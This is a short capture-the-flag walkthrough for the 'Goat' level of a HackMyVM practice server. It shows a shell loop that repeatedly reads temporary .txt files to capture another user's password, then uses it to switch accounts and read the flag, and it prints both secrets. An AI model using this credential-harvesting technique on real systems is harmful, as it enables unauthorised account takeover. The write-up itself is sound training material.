### Level Goat
User alexa puts her password in a .txt file in /free every minute and then deletes it. 
### User
**freya**
### Credentials
ssh hacker@venus.hackmyvm.eu -p 5000
pass: **havefun!**
### Solution
```shell
freya@venus:~$ cd free
freya@venus:/free$ while true; do cat /free/*.txt;done 2>/dev/null
mxq9O3MSxxX9Q3S
freya@venus:/free$ su alexa 
Password:
alexa@venus:/$ cd pwned/alexa
alexa@venus:~$ ls
flagz.txt  mission.txt
alexa@venus:~$ cat flagz.txt 
8===12ALP3eLlJ1GrTBxwJQM===D~~
alexa@venus:~$ 

```
### Summary

usamos un bucle while que se ejecutara hasta que lo paremos y este mostrara el contenido de todos los archivos que tengan una extension .txt 